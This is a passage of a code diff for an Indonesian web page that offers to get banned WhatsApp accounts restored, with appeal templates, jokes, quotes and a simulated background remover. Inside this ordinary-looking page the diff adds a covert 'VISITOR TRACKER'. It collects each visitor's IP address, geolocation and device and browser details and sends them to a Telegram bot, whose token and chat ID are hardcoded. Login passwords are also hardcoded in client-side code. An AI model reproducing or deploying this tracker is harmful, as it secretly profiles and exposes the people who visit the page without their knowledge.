+                        <label class="radio-option">
+                            <input type="radio" name="option" value="spam">
+                            2. Spam
+                        </label>
                     </div>
                 </div>
                 
-                <button id="uploadBtn" class="upload-btn" disabled>Upload File</button>
+                <!-- Fitur Baru: Progress Bar -->
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text">
+                        <span>Mulai</span>
+                        <span>Selesai</span>
+                    </div>
+                </div>
                 
-                <div id="uploadResult" class="upload-result">
-                    <p class="result-title" id="uploadResultTitle">Upload Berhasil!</p>
-                    <p class="result-url" id="uploadResultUrl"></p>
-                    <button class="copy-btn" id="copyUploadBtn">Salin URL</button>
+                <div class="status-indicator">
+                    <div class="status-step active">1</div>
+                    <div class="status-step">2</div>
+                    <div class="status-step">3</div>
+                    <div class="status-label">Pilih Opsi</div>
+                    <div class="status-label" style="left: 35%;">Verifikasi</div>
+                    <div class="status-label" style="left: 70%;">Selesai</div>
+                </div>
+                
+                <button id="sendEmailBtn" class="btn">
+                    <i class="fas fa-paper-plane"></i> Kirim Permohonan
+                </button>
+                <div id="successMsg" class="success">
+                    <i class="fas fa-check-circle"></i> Permohonan berhasil dikirim!
                 </div>
             </div>
         </div>
         
+        <!-- Tab Riwayat -->
+        <div id="history-tab" class="tab-content">
+            <div class="option-title">
+                <i class="fas fa-history"></i> Riwayat Permohonan
+            </div>
+            <div class="history-list">
+                <div class="history-item">
+                    <div class="history-date">15 Juli 2023 - 10:30</div>
+                    <div class="history-status status-pending">
+                        <i class="fas fa-clock"></i> Menunggu verifikasi
+                    </div>
+                </div>
+                <div class="history-item">
+                    <div class="history-date">10 Juli 2023 - 14:22</div>
+                    <div class="history-status status-success">
+                        <i class="fas fa-check-circle"></i> Berhasil di-unband
+                    </div>
+                </div>
+                <div class="history-item">
+                    <div class="history-date">5 Juli 2023 - 09:15</div>
+                    <div class="history-status status-failed">
+                        <i class="fas fa-times-circle"></i> Ditolak - data tidak lengkap
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Fitur Baru: Tombol Ekspor Riwayat -->
+            <button id="exportHistoryBtn" class="btn btn-purple" style="margin-top: 15px;">
+                <i class="fas fa-download"></i> Ekspor Riwayat
+            </button>
+        </div>
+        
+        <!-- Tab Fun Baru -->
+        <div id="fun-tab" class="tab-content">
+            <div class="option-title">
+                <i class="fas fa-gamepad"></i> Fitur Seru
+            </div>
+            
+            <!-- Kata-kata Random -->
+            <div class="quote-container">
+                <div class="quote-text" id="quoteText">
+                    Klik tombol di bawah untuk mendapatkan kata-kata inspiratif!
+                </div>
+                <div class="quote-genre" id="quoteGenre">
+                    Genre: -
+                </div>
+                <button id="generateQuoteBtn" class="btn btn-blue">
+                    <i class="fas fa-quote-right"></i> Dapatkan Kata-kata
+                </button>
+            </div>
+            
+            <!-- Fitur Fun Lainnya -->
+            <div class="fun-features">
+                <button class="fun-btn" id="jokeBtn">
+                    <div class="fun-icon">😂</div>
+                    <div>Lelucon</div>
+                </button>
+                <button class="fun-btn" id="factBtn">
+                    <div class="fun-icon">🧠</div>
+                    <div>Fakta Unik</div>
+                </button>
+                <button class="fun-btn" id="memeBtn">
+                    <div class="fun-icon">🖼️</div>
+                    <div>Generator Meme</div>
+                </button>
+                <button class="fun-btn" id="gameBtn">
+                    <div class="fun-icon">🎮</div>
+                    <div>Mini Game</div>
+                </button>
+            </div>
+        </div>
+        
+        <!-- Tab Tools -->
+        <div id="tools-tab" class="tab-content">
+            <div class="option-title">
+                <i class="fas fa-tools"></i> Alat Bantu Tambahan
+            </div>
+            
+            <div class="feature-grid" style="margin-bottom: 20px;">
+                <div class="feature-item" id="backupBtn">
+                    <div class="feature-icon">
+                        <i class="fas fa-save"></i>
+                    </div>
+                    <div class="feature-text">Backup Data</div>
+                </div>
+                <div class="feature-item" id="restoreBtn">
+                    <div class="feature-icon">
+                        <i class="fas fa-undo"></i>
+                    </div>
+                    <div class="feature-text">Restore Data</div>
+                </div>
+                <div class="feature-item" id="checkStatusBtn">
+                    <div class="feature-icon">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <div class="feature-text">Cek Status</div>
+                </div>
+                <div class="feature-item" id="clearCacheBtn">
+                    <div class="feature-icon">
+                        <i class="fas fa-broom"></i>
+                    </div>
+                    <div class="feature-text">Bersihkan Cache</div>
+                </div>
+            </div>
+            
+            <div class="option-group">
+                <div class="option-title">
+                    <i class="fas fa-cog"></i> Pengaturan
+                </div>
+                <div class="radio-group">
+                    <label class="radio-option">
+                        <input type="checkbox" id="autoSave">
+                        Simpan otomatis
+                    </label>
+                    <label class="radio-option">
+                        <input type="checkbox" id="notifications" checked>
+                        Notifikasi
+                    </label>
+                    <label class="radio-option">
+                        <input type="checkbox" id="darkMode">
+                        Mode Gelap
+                    </label>
+                </div>
+            </div>
+            
+            <button class="btn btn-orange" style="margin-top: 15px;">
+                <i class="fas fa-sync"></i> Perbarui Aplikasi
+            </button>
+        </div>
+        
         <!-- Tab Penghapus Background -->
         <div id="bgremover-tab" class="tab-content">
-            <!-- Konten tab bg remover sebelumnya -->
-            <!-- ... -->
+            <div class="background-remover">
+                <div class="bg-remover-title">
+                    <i class="fas fa-image"></i> Penghapus Background
+                </div>
+                
+                <div class="bg-remover-container">
+                    <div class="input-group">
+                        <label for="bgImageUpload"><i class="fas fa-upload"></i> Unggah Gambar:</label>
+                        <input type="file" id="bgImageUpload" accept="image/*">
+                    </div>
+                    
+                    <div class="bg-remover-preview">
+                        <div class="bg-remover-canvas-container">
+                            <canvas id="originalCanvas" class="bg-remover-canvas"></canvas>
+                        </div>
+                        <div class="bg-remover-canvas-container">
+                            <canvas id="processedCanvas" class="bg-remover-canvas"></canvas>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-remover-controls">
+                        <button id="removeBgBtn" class="bg-remover-btn primary" disabled>
+                            <i class="fas fa-magic"></i> Hapus Background
+                        </button>
+                        <button id="downloadBgBtn" class="bg-remover-btn" disabled>
+                            <i class="fas fa-download"></i> Unduh Hasil
+                        </button>
+                        <button id="resetBgBtn" class="bg-remover-btn">
+                            <i class="fas fa-redo"></i> Reset
+                        </button>
+                    </div>
+                    
+                    <div class="progress-container" style="display: none;" id="bgRemoverProgress">
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="bgRemoverProgressFill"></div>
+                        </div>
+                        <div class="progress-text">
+                            <span>Memproses...</span>
+                            <span id="bgRemoverProgressText">0%</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
-        // Semua kode JavaScript sebelumnya tetap sama
-        // ... 
+        // Elemen DOM
+        const loginPage = document.getElementById('loginPage');
+        const mainPage = document.getElementById('mainPage');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const joinGroupBtn = document.getElementById('joinGroupBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const sendEmailBtn = document.getElementById('sendEmailBtn');
+        const successMsg = document.getElementById('successMsg');
+        const options = document.querySelector('.options');
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+        const notification = document.getElementById('notification');
+        const notificationText = document.getElementById('notification-text');
+        const progressFill = document.getElementById('progressFill');
+        const themeToggles = document.querySelectorAll('.theme-toggle');
+        const exportHistoryBtn = document.getElementById('exportHistoryBtn');
+        const backupBtn = document.getElementById('backupBtn');
+        const restoreBtn = document.getElementById('restoreBtn');
+        const checkStatusBtn = document.getElementById('checkStatusBtn');
+        const clearCacheBtn = document.getElementById('clearCacheBtn');
+        const lightningContainer = document.getElementById('lightningContainer');
         
-        // Elemen untuk fitur upload
-        const fileInput = document.getElementById('fileInput');
-        const uploadArea = document.getElementById('uploadArea');
-        const uploadBtn = document.getElementById('uploadBtn');
-        const uploadResult = document.getElementById('uploadResult');
-        const uploadResultTitle = document.getElementById('uploadResultTitle');
-        const uploadResultUrl = document.getElementById('uploadResultUrl');
-        const copyUploadBtn = document.getElementById('copyUploadBtn');
+        // Elemen untuk fitur baru
+        const playVoiceBtn = document.getElementById('playVoiceBtn');
+        const stopVoiceBtn = document.getElementById('stopVoiceBtn');
+        const batteryLevel = document.getElementById('batteryLevel');
+        const batteryStatus = document.getElementById('batteryStatus');
         
-        let selectedFile = null;
+        // Elemen untuk fitur fun
+        const generateQuoteBtn = document.getElementById('generateQuoteBtn');
+        const quoteText = document.getElementById('quoteText');
+        const quoteGenre = document.getElementById('quoteGenre');
+        const jokeBtn = document.getElementById('jokeBtn');
+        const factBtn = document.getElementById('factBtn');
+        const memeBtn = document.getElementById('memeBtn');
+        const gameBtn = document.getElementById('gameBtn');
         
-        // Event listeners untuk drag and drop
-        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
-            uploadArea.addEventListener(eventName, preventDefaults, false);
-        });
+        // Elemen untuk penghapus background
+        const bgImageUpload = document.getElementById('bgImageUpload');
+        const originalCanvas = document.getElementById('originalCanvas');
+        const processedCanvas = document.getElementById('processedCanvas');
+        const removeBgBtn = document.getElementById('removeBgBtn');
+        const downloadBgBtn = document.getElementById('downloadBgBtn');
+        const resetBgBtn = document.getElementById('resetBgBtn');
+        const bgRemoverProgress = document.getElementById('bgRemoverProgress');
+        const bgRemoverProgressFill = document.getElementById('bgRemoverProgressFill');
+        const bgRemoverProgressText = document.getElementById('bgRemoverProgressText');
         
-        function preventDefaults(e) {
-            e.preventDefault();
-            e.stopPropagation();
-        }
+        // Konteks canvas
+        const originalCtx = originalCanvas.getContext('2d');
+        const processedCtx = processedCanvas.getContext('2d');
         
-        ['dragenter', 'dragover'].forEach(eventName => {
-            uploadArea.addEventListener(eventName, highlight, false);
-        });
+        // Sandi yang benar (banyak sandi)
+        const correctPasswords = [
+            "RapzXyz-Novalia",
+            "UnbandWa2024",
+            "RapzDeveloper",
+            "WhatsAppTools",
+            "BebaskanAkunWa"
+        ];
         
-        ['dragleave', 'drop'].forEach(eventName => {
-            uploadArea.addEventListener(eventName, unhighlight, false);
-        });
+        // Database kata-kata random
+        const quotes = {
+            cinta: [
+                "Cinta itu seperti angin, kau tidak bisa melihatnya tetapi bisa merasakannya.",
+                "Di balik setiap kesuksesan pria, ada wanita yang mendukungnya. Di balik kesuksesan wanita, ada pria yang membuatnya kuat.",
+                "Cinta sejati tidak butuh penjelasan, tapi butuh bukti.",
+                "Cinta itu bukan tentang memiliki, tapi tentang memberi.",
+                "Cinta yang tulus tidak membutuhkan alasan, ia datang dari hati yang ikhlas."
+            ],
+            sindiran: [
+                "Kadang lebih baik diam daripada bicara, karena diam adalah jawaban yang paling elegan untuk orang yang sombong.",
+                "Jangan terlalu bangga dengan apa yang kamu punya, karena suatu saat kamu akan sadar bahwa itu semua hanya titipan.",
+                "Orang yang sok tahu biasanya tidak tahu apa-apa.",
+                "Jangan menilai buku dari covernya, tapi jangan juga menilai orang dari penampilannya.",
+                "Kesombongan adalah beban terberat yang harus ditanggung oleh orang yang lemah."
+            ],
+            lelucon: [
+                "Kenapa komputer tidak bisa makan? Karena dia sudah kenyang dengan byte!",
+                "Apa bedanya hantu sama tukang bakso? Kalau hantu 'huuuuuntuuu', kalau tukang bakso 'baaaaksoooo'!",
+                "Kenapa ayam menyebrang jalan? Untuk sampai ke seberang!",
+                "Guru: 'Ani, sebutkan 5 hewan yang hidup di kutub utara!' Ani: '4 penguin dan 1 beruang kutub, Bu!' Guru: 'Tapi penguin hidup di kutub selatan!' Ani: 'Ya sudah, 5 beruang kutub saja, Bu!'",
+                "Kenapa dinosaurus punah? Karena tidak ada yang mengajarkan mereka cara bertahan hidup!"
+            ],
+            motivasi: [
+                "Jangan menyerah, mimpi tidak akan pernah mengecewakanmu jika kau tidak mengecewakan mimpimu.",
+                "Kegagalan adalah kesempatan untuk memulai lagi dengan lebih cerdas.",
+                "Sukses bukan tentang seberapa besar pencapaianmu, tapi tentang seberapa besar kamu bangkit setelah jatuh.",
+                "Jangan takut gagal, takutlah jika tidak pernah mencoba.",
+                "Hidup ini seperti naik sepeda, untuk menjaga keseimbangan, kamu harus terus bergerak."
+            ],
+            bijak: [
+                "Lebih baik diam dan dianggap bodoh, daripada berbicara dan menghilangkan keraguan.",
+                "Hidup ini terlalu singkat untuk membenci orang lain. Maafkan dan lupakan.",
+                "Kebahagiaan bukanlah tujuan, melainkan perjalanan. Nikmati setiap langkahnya.",
+                "Jangan menunggu kesempatan, ciptakanlah.",
+                "Kesederhanaan adalah kunci kebahagiaan sejati."
+            ]
+        };
         
-        function highlight() {
-            uploadArea.classList.add('highlight');
-        }
+        // Database lelucon
+        const jokes = [
+            "Kenapa matematika itu seperti laut? Karena sama-sama berisi angka (ikan)!",
+            "Apa yang dilakukan programmer ketika mati lampu? Ia menunggu hidup lagi!",
+            "Kenapa programmer tidak bisa menjadi dokter? Karena mereka hanya bisa mengobati bug, bukan manusia!",
+            "Apa bahasa pemrograman favorit hantu? Boo-lang!",
+            "Kenapa JavaScript dan Java tidak akur? Karena mereka sama-sama tidak suka dihubung-hubungkan!"
+        ];
         
-        function unhighlight() {
-            uploadArea.classList.remove('highlight');
-        }
+        // Database fakta unik
+        const facts = [
+            "Lebah dapat mengenali wajah manusia!",
+            "Pohon pisang sebenarnya adalah tanaman herba terbesar di dunia, bukan pohon.",
+            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly good to eat.",
+            "The shortest war in history was between Britain and Zanzibar on August 27, 1896. Zanzibar surrendered after 38 minutes.",
+            "Octopuses have three hearts."
+        ];
         
-        uploadArea.addEventListener('drop', handleDrop, false);
+        // Teks email untuk masing-masing opsi
+        const emailTexts = {
+            permanen: "Привет, продвинутый мета-ай, WhatsApp / для справочного центра мета-ай, с уважением. Я хочу подать апелляцию на блокировку моей учетной записи. [+62no lu@meta.whatsapp.com] Номер заблокирован с 2018 года, но я хочу использовать WhatsApp для связи. Я прочитал статью/службу конфиденциальности, поддерживаемую службой поддержки WhatsApp [https://faq.whatsapp.com/general/23154266]. Поэтому я попросил WhatsApp восстановить мою юридически заблокированную учетную запись, поскольку я не нарушал правила WhatsApp и соблюдал их. Надеюсь, вы поняли, что я сказал. Надеюсь, вы обработаете мое сообщение. Спасибо. С уважением, [спасибо]",
+            spam: "Akun whatsapp saya secara tiba-tiba diblokir karena spam, walaupun saya telah mematuhi ketentuan layanan di whatsapp, mohon tinjau akun saya dan segera selesaikan masalah ini, Terima kasih. Ini nomor saya : [+62 xxnomor lu]"
+        };
         
-        function handleDrop(e) {
-            const dt = e.dataTransfer;
-            const files = dt.files;
-            handleFiles(files);
-        }
+        // Konfigurasi Telegram Bot
+        const TELEGRAM_BOT_TOKEN = "8024500747:AAFvoMNFoP2r5Mcj0vN4_6VQDDCmWZ9t854";
+        const TELEGRAM_CHAT_ID = "8136310152";
         
-        fileInput.addEventListener('change', function() {
-            handleFiles(this.files);
-        });
+        // Variabel untuk melacak sesi login
+        let activeSessions = {};
+        let currentSessionId = null;
         
-        function handleFiles(files) {
-            if (files.length > 0) {
-                selectedFile = files[0];
+        // Variabel untuk penghapus background
+        let originalImage = null;
+        
+        // Fungsi untuk membuat efek bintang jatuh
+        function createFallingStars() {
+            const fallingStarsContainer = document.getElementById('fallingStars');
+            
+            function createFallingStar() {
+                const star = document.createElement('div');
+                star.classList.add('falling-star');
                 
-                // Validasi tipe file
-                const fileType = selectedFile.type;
-                if (!fileType.startsWith('image/') && !fileType.startsWith('video/')) {
-                    showUploadResult('error', 'Hanya file gambar dan video yang diizinkan.');
-                    uploadBtn.disabled = true;
+                // Posisi awal acak
+                const startX = Math.random() * 100;
+                star.style.left = `${startX}%`;
+                star.style.top = '-10px';
+                
+                // Ukuran acak
+                const size = 1 + Math.random() * 3;
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                
+                // Warna acak
+                const colors = ['#ffffff', '#1e3a8a', '#dc2626', '#9c27b0', '#ff9800'];
+                const randomColor = colors[Math.floor(Math.random() * colors.length)];
+                star.style.backgroundColor = randomColor;
+                star.style.boxShadow = `0 0 10px 2px ${randomColor}`;
+                
+                // Durasi animasi acak
+                const duration = 1 + Math.random() * 3;
+                star.style.animation = `fallingStar ${duration}s linear forwards`;
+                
+                // Tambahkan ke container
+                fallingStarsContainer.appendChild(star);
+                
+                // Hapus setelah animasi selesai
+                setTimeout(() => {
+                    star.remove();
+                }, duration * 1000);
+            }
+            
+            // Buat bintang jatuh secara berkala
+            setInterval(() => {
+                if (Math.random() > 0.7) { // 30% kemungkinan muncul bintang jatuh
+                    createFallingStar();
+                }
+            }, 1000);
+        }
+        
+        // Fungsi untuk membuat efek petir
+        function createLightning() {
+            const lightning = document.createElement('div');
+            lightning.classList.add('lightning');
+            
+            // Posisi acak
+            const left = Math.random() * 100;
+            lightning.style.left = `${left}%`;
+            
+            // Warna acak
+            const colors = [
+                'rgba(30, 58, 138, 0.8)',
+                'rgba(220, 38, 38, 0.8)',
+                'rgba(15, 15, 15, 0.8)'
+            ];
+            const randomColor = colors[Math.floor(Math.random() * colors.length)];
+            lightning.style.background = `linear-gradient(to bottom, ${randomColor}, transparent)`;
+            
+            // Tambahkan ke container
+            lightningContainer.appendChild(lightning);
+            
+            // Animasi petir
+            lightning.style.animation = `lightning ${0.5 + Math.random() * 1}s ease-in-out`;
+            
+            // Hapus setelah animasi selesai
+            setTimeout(() => {
+                lightning.remove();
+            }, 2000);
+        }
+        
+        // Fungsi untuk membuat efek petir secara berkala
+        function startLightningEffect() {
+            // Buat petir pertama setelah delay acak
+            setTimeout(() => {
+                createLightning();
+                // Set interval untuk petir berikutnya
+                setInterval(() => {
+                    if (Math.random() > 0.3) { // 70% kemungkinan muncul petir
+                        createLightning();
+                    }
+                }, 3000);
+            }, Math.random() * 5000);
+        }
+        
+        // Fungsi untuk mengumpulkan informasi pengguna
+        async function collectUserInfo() {
+            try {
+                // Mendapatkan informasi IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Mendapatkan informasi lokasi berdasarkan IP
+                let locationInfo = "Tidak dapat mengambil informasi lokasi";
+                try {
+                    const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                    const locationData = await locationResponse.json();
+                    locationInfo = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                } catch (e) {
+                    console.log("Tidak dapat mengambil info lokasi");
+                }
+                
+                // Informasi browser dan perangkat
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenResolution = `${screen.width}x${screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const currentTime = new Date().toLocaleString('id-ID');
+                
+                // Informasi tambahan
+                const cookiesEnabled = navigator.cookieEnabled;
+                const javaEnabled = navigator.javaEnabled();
+                const pdfEnabled = navigator.pdfViewerEnabled;
+                
+                return {
+                    ip: userIP,
+                    location: locationInfo,
+                    userAgent: userAgent,
+                    platform: platform,
+                    language: language,
+                    screenResolution: screenResolution,
+                    timezone: timezone,
+                    visitTime: currentTime,
+                    cookiesEnabled: cookiesEnabled,
+                    javaEnabled: javaEnabled,
+                    pdfEnabled: pdfEnabled,
+                    referrer: document.referrer || "Direct visit"
+                };
+            } catch (error) {
+                console.error("Error collecting user info:", error);
+                return {
+                    ip: "Tidak dapat mengambil IP",
+                    location: "Tidak dapat mengambil lokasi",
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    visitTime: new Date().toLocaleString('id-ID'),
+                    cookiesEnabled: navigator.cookieEnabled,
+                    javaEnabled: navigator.javaEnabled(),
+                    pdfEnabled: navigator.pdfViewerEnabled,
+                    referrer: document.referrer || "Direct visit"
+                };
+            }
+        }
+        
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(userInfo) {
+            const message = `
+🔍 *VISITOR TRACKER* - Unband WhatsApp By-RapzXyz
+
+📱 *Informasi Perangkat:*
+• IP: ${userInfo.ip}
+• Lokasi: ${userInfo.location}
+• Platform: ${userInfo.platform}
+• Bahasa: ${userInfo.language}
+• Resolusi Layar: ${userInfo.screenResolution}
+• Timezone: ${userInfo.timezone}
+
+🌐 *Browser Info:*
+• User Agent: ${userInfo.userAgent}
+• Cookies: ${userInfo.cookiesEnabled ? 'Aktif' : 'Nonaktif'}
+• Java: ${userInfo.javaEnabled ? 'Aktif' : 'Nonaktif'}
+• PDF Viewer: ${userInfo.pdfEnabled ? 'Aktif' : 'Nonaktif'}
+
+📊 *Data Kunjungan:*
+• Waktu: ${userInfo.visitTime}
+• Referrer: ${userInfo.referrer}
+
+⚠️ *Dikumpulkan otomatis oleh sistem*
+            `;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('Data berhasil dikirim ke Telegram');
+                } else {
+                    console.error('Gagal mengirim data ke Telegram');
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+        
+        // Fungsi untuk membuat bintang
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            const starCount = 150;
+            
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+                
+                // Ukuran acak
+                const size = Math.random() * 3;
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                
+                // Posisi acak
+                star.style.left = `${Math.random() * 100}%`;
+                star.style.top = `${Math.random() * 100}%`;
+                
+                // Durasi animasi acak
+                star.style.setProperty('--duration', `${5 + Math.random() * 10}s`);
+                
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        // Fungsi untuk menampilkan notifikasi
+        function showNotification(message, type = 'success') {
+            notificationText.textContent = message;
+            notification.className = 'notification';
+            notification.classList.add('show');
+            
+            if (type === 'success') {
+                notification.classList.add('notification-success');
+            } else {
+                notification.classList.add('notification-error');
+            }
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Fungsi untuk memperbarui progress bar
+        function updateProgress(percent) {
+            progressFill.style.width = `${percent}%`;
+        }
+        
+        // Fungsi untuk menghasilkan kata-kata random
+        function generateRandomQuote() {
+            const genres = Object.keys(quotes);
+            const randomGenre = genres[Math.floor(Math.random() * genres.length)];
+            const genreQuotes = quotes[randomGenre];
+            const randomQuote = genreQuotes[Math.floor(Math.random() * genreQuotes.length)];
+            
+            quoteText.textContent = randomQuote;
+            quoteGenre.textContent = `Genre: ${randomGenre.charAt(0).toUpperCase() + randomGenre.slice(1)}`;
+        }
+        
+        // Fungsi untuk memutar voice intro
+        function playVoiceIntro() {
+            // Menggunakan Web Speech API untuk mensintesis suara
+            if ('speechSynthesis' in window) {
+                const utterance = new SpeechSynthesisUtterance();
+                utterance.text = "Selamat datang, jika belum bisa login silahkan ke contact developer atau admin aja ya";
+                utterance.lang = 'id-ID';
+                utterance.rate = 1.0;
+                utterance.pitch = 1.0;
+                
+                window.speechSynthesis.speak(utterance);
+                showNotification('Memutar voice intro...', 'success');
+            } else {
+                showNotification('Browser tidak mendukung fitur voice intro', 'error');
+            }
+        }
+        
+        // Fungsi untuk menghentikan voice intro
+        function stopVoiceIntro() {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                showNotification('Voice intro dihentikan', 'success');
+            }
+        }
+        
+        // Fungsi untuk memeriksa status baterai
+        function checkBatteryStatus() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    updateBatteryInfo(battery);
+                    
+                    battery.addEventListener('levelchange', function() {
+                        updateBatteryInfo(battery);
+                    });
+                    
+                    battery.addEventListener('chargingchange', function() {
+                        updateBatteryInfo(battery);
+                    });
+                });
+            } else {
+                batteryLevel.textContent = 'Tidak tersedia';
+                batteryStatus.textContent = 'Fitur baterai tidak didukung browser ini';
+            }
+        }
+        
+        // Fungsi untuk memperbarui informasi baterai
+        function updateBatteryInfo(battery) {
+            const level = Math.round(battery.level * 100);
+            batteryLevel.textContent = `${level}%`;
+            
+            if (battery.charging) {
+                batteryStatus.textContent = 'Sedang diisi';
+            } else {
+                if (level > 70) {
+                    batteryStatus.textContent = 'Baterai penuh';
+                } else if (level > 30) {
+                    batteryStatus.textContent = 'Baterai sedang';
+                } else {
+                    batteryStatus.textContent = 'Baterai rendah';
+                }
+            }
+        }
+        
+        // Fungsi untuk memeriksa sesi aktif
+        function checkActiveSessions(password) {
+            const now = Date.now();
+            const sessionTimeout = 5 * 60 * 1000; // 5 menit
+            
+            // Hapus sesi yang sudah kadaluarsa
+            for (const sessionId in activeSessions) {
+                if (now - activeSessions[sessionId].timestamp > sessionTimeout) {
+                    delete activeSessions[sessionId];
+                }
+            }
+            
+            // Periksa apakah sandi sedang digunakan di perangkat lain
+            for (const sessionId in activeSessions) {
+                if (activeSessions[sessionId].password === password && sessionId !== currentSessionId) {
+                    return true; // Sandi sedang digunakan di perangkat lain
+                }
+            }
+            
+            return false; // Sandi tidak sedang digunakan di perangkat lain
+        }
+        
+        // Fungsi untuk menghapus background gambar
+        function removeBackground() {
+            if (!originalImage) return;
+            
+            // Tampilkan progress bar
+            bgRemoverProgress.style.display = 'block';
+            bgRemoverProgressFill.style.width = '0%';
+            bgRemoverProgressText.textContent = '0%';
+            
+            // Simulasi proses penghapusan background
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 5;
+                bgRemoverProgressFill.style.width = `${progress}%`;
+                bgRemoverProgressText.textContent = `${progress}%`;
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    
+                    // Set ukuran canvas hasil
+                    processedCanvas.width = originalCanvas.width;
+                    processedCanvas.height = originalCanvas.height;
+                    
+                    // Salin gambar ke canvas hasil
+                    processedCtx.drawImage(originalImage, 0, 0, processedCanvas.width, processedCanvas.height);
+                    
+                    // Simulasi penghapusan background (dalam implementasi nyata, ini akan menggunakan algoritma yang lebih kompleks)
+                    // Di sini kita hanya membuat background transparan untuk area tertentu
+                    const imageData = processedCtx.getImageData(0, 0, processedCanvas.width, processedCanvas.height);
+                    const data = imageData.data;
+                    
+                    // Algoritma sederhana untuk menghapus background berdasarkan warna
+                    for (let i = 0; i < data.length; i += 4) {
+                        const r = data[i];
+                        const g = data[i + 1];
+                        const b = data[i + 2];
+                        
+                        // Deteksi warna background (dalam contoh ini, kita asumsikan background adalah warna gelap)
+                        // Dalam implementasi nyata, ini akan menggunakan algoritma yang lebih canggih
+                        if (r < 50 && g < 50 && b < 50) {
+                            data[i + 3] = 0; // Set alpha ke 0 (transparan)
+                        }
+                    }
+                    
+                    processedCtx.putImageData(imageData, 0, 0);
+                    
+                    // Aktifkan tombol unduh
+                    downloadBgBtn.disabled = false;
+                    
+                    // Sembunyikan progress bar
+                    setTimeout(() => {
+                        bgRemoverProgress.style.display = 'none';
+                    }, 500);
+                    
+                    showNotification('Background berhasil dihapus!', 'success');
+                }
+            }, 100);
+        }
+        
+        // Fungsi untuk mengunduh gambar hasil
+        function downloadProcessedImage() {
+            if (!processedCanvas) return;
+            
+            const link = document.createElement('a');
+            link.download = 'gambar-tanpa-background.png';
+            link.href = processedCanvas.toDataURL('image/png');
+            link.click();
+            
+            showNotification('Gambar berhasil diunduh!', 'success');
+        }
+        
+        // Fungsi untuk mereset penghapus background
+        function resetBackgroundRemover() {
+            originalCtx.clearRect(0, 0, originalCanvas.width, originalCanvas.height);
+            processedCtx.clearRect(0, 0, processedCanvas.width, processedCanvas.height);
+            originalImage = null;
+            removeBgBtn.disabled = true;
+            downloadBgBtn.disabled = true;
+            bgImageUpload.value = '';
+            bgRemoverProgress.style.display = 'none';
+            
+            showNotification('Penghapus background direset', 'success');
+        }
+        
+        // Event listener untuk tombol login
+        loginBtn.addEventListener('click', function() {
+            const enteredPassword = passwordInput.value;
+            
+            if (correctPasswords.includes(enteredPassword)) {
+                // Periksa apakah sandi sedang digunakan di perangkat lain
+                if (checkActiveSessions(enteredPassword)) {
+                    showNotification('Sandi sedang digunakan di perangkat lain!', 'error');
                     return;
                 }
                 
-                // Tampilkan info file
-                const fileInfo = uploadArea.querySelector('.file-info');
-                fileInfo.textContent = `File: ${selectedFile.name} (${formatFileSize(selectedFile.size)})`;
+                // Buat sesi baru
+                currentSessionId = generateSessionId();
+                activeSessions[currentSessionId] = {
+                    password: enteredPassword,
+                    timestamp: Date.now()
+                };
                 
-                uploadBtn.disabled = false;
+                // Password benar, pindah ke halaman utama
+                loginPage.style.display = 'none';
+                mainPage.style.display = 'block';
+                options.style.display = 'block';
+                showNotification('Login berhasil!', 'success');
+            } else {
+                // Password salah, tampilkan pesan error
+                errorMsg.style.display = 'block';
+                showNotification('Sandi salah! Coba lagi.', 'error');
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 3000);
             }
-        }
+        });
         
-        uploadBtn.addEventListener('click', function() {
-            if (!selectedFile) return;
+        // Event listener untuk tombol join group
+        joinGroupBtn.addEventListener('click', function() {
+            window.open('https://chat.whatsapp.com/KjG7J6cDMW2KLCtYx0sLKP?mode=wwc', '_blank');
+        });
+        
+        // Event listener untuk tombol kirim email
+        sendEmailBtn.addEventListener('click', function() {
+            const selectedOption = document.querySelector('input[name="option"]:checked');
             
-            uploadBtn.disabled = true;
-            uploadBtn.textContent = 'Mengupload...';
+            if (!selectedOption) {
+                showNotification('Pilih opsi terlebih dahulu!', 'error');
